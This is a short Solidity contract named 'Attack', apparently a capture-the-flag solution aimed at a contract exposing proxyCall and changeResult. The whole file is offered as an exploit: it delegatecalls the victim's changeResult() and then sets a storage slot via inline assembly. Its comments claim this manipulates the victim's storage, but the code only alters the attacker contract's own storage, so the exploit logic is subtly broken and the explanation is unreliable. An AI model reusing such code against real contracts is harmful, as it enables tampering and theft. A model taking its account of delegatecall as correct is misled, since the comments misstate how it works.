// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    bool private storageSlot; // For storing manipulated data in storage

    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    // Malicious function to exploit the vulnerability in the victim contract
    function exploit() external {
        // Assemble the data for delegatecall to call changeResult function in victim contract
        bytes memory data = abi.encodeWithSignature("changeResult()");
        // Execute delegatecall to call changeResult function in victim contract
        (bool success,) = victim.delegatecall(data);
        require(success, "Delegatecall failed");
        // Manipulate the victim contract's storage slot to achieve the desired result
        // In this case, setting storageSlot to true
        assembly {
            sstore(storageSlot.slot, 1)
        }
    }
    
    // Fallback function to receive ETH
    receive() external payable {}
}
